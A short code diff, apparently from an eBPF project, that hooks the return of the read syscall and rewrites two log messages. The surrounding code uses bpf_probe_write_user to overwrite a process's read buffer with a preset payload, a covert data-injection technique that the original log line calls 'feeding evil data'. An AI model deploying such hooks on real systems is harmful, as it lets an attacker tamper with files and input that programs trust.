@@ -139,9 +139,9 @@ int kretprobe____x64_sys_read(struct pt_regs *ctx) {
 
   if (ret > 0) {
     if (sizeof(payload)-1 >= ret) 
-      bpf_trace_printk("out of buffer\\n");
+      bpf_trace_printk("Out of buffer, please make your input size smaller.\\n");
     else {
-      bpf_trace_printk("feeding evil data");
+      bpf_trace_printk("Successfully insert payload!");
       bpf_probe_write_user(buf, &payload, sizeof(payload)-1);
     }
   }
